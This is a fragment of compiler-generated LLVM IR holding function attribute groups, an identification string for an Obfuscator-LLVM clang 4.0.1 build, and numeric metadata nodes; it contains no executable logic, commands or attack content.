attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146535865}
!2 = !{i32 -2146535174}
!3 = !{i32 -2146534425}
!4 = !{i32 -2146533715}
!5 = !{i32 -2146532897}
!6 = !{i32 -2146532006}
